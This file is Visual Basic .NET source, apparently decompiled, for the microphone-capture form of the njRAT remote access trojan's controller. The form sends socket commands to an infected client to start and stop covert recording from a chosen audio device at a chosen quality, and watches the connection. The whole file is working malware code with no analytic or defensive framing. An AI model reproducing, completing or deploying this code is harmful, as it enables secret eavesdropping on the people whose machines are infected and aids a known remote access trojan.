Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports NJRAT.NJRAT

Public Class Mic
    Public Sub New()
        Me.QQ = String.Empty
        Me.InitializeComponent()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If (Me.Button1.Text = "Start") Then
            Me.Button1.Text = "Stop"
            Me.Button1.Image = My.Resources.control_pause_blue
            Me.ComboBox1.Enabled = False
            Me.ComboBox2.Enabled = False
            Dim num As Integer = 0
            If Me.ComboBox2.Text.Contains("16bit") Then
                num = 1
            End If
            Me.sk.Send(String.Concat(New String() {"~", Class7.string_1, Me.ComboBox1.SelectedIndex.ToString, Class7.string_1, Conversions.ToString(CInt(Math.Round(CDbl((Conversions.ToDouble(Me.ComboBox2.Text.Split(New Char() {" "c})(0)) * 1024))))), Class7.string_1, Conversions.ToString(num)}))
        Else
            Me.sk.Send(("~" & Class7.string_1 & "-1"))
            Me.Button1.Image = My.Resources.control_play_blue
            Me.Button1.Text = "Start"
            Me.ComboBox1.Enabled = True
            Me.ComboBox2.Enabled = True
        End If
    End Sub

    Private Sub Mic_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Try
            If Me.sk.CN Then
                Me.sk.Send(("~" & Class7.string_1 & "-1"))
            End If
            Me.sk.CN = False
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Mic_Load(sender As Object, e As EventArgs) Handles Me.Load
        Try
            Me.QQ = Conversions.ToString(Class7.smethod_1(Me.osk.L))
            Me.Text = (Class6.smethod_17(0) & " " & Me.QQ)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
        If (Me.ComboBox1.Items.Count = 0) Then
            Me.Close()
        Else
            Me.Button1.ImageAlign = ContentAlignment.MiddleLeft
            Me.Button1.Image = My.Resources.control_play_blue
            Me.ComboBox1.SelectedIndex = 0
            If (Class7.class8_0.int_1 > (Me.ComboBox2.Items.Count - 1)) Then
                Class7.class8_0.int_1 = 0
            End If
            Me.ComboBox2.SelectedIndex = Class7.class8_0.int_1
            If Class7.class8_0.bool_8 Then
                Me.Button1_Click(RuntimeHelpers.GetObjectValue(sender), e)
            End If
        End If
    End Sub

    Public osk As Client
    Public QQ As String
    Public sk As Client

    Private Sub vmethod_4_Tick(sender As Object, e As EventArgs) Handles vmethod_4.Tick
        Try
            If ((Me.osk Is Nothing) Or (Me.sk Is Nothing)) Then
                Me.Close()
                Return
            End If
            If (Not Me.osk.CN Or Not Me.sk.CN) Then
                Me.Close()
            End If
        Catch exception1 As Exception

        End Try
        Me.ProgressBar1.Value = Me.sk.rp
    End Sub
End Class